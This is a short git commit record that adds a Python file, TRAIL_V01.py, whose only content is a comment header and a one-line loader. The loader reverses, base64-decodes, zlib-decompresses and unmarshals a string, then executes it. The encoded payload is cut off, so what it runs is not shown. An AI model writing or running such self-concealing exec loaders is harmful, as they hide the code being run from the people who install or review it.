84d48fc4427b4175d6444f4ac6fbce7d5c85a693
KING-CYBER-450 <125738286+KING-CYBER-450@users.noreply.github.com>
2023-10-31 23:28:06 +0600

    Create TRAIL_V01.py

---
+++ TRAIL_V01.py
@@ -0,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Tue Oct 31 23:23:38 2023
+# -------------------------------
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==wY3t1DB8P5>
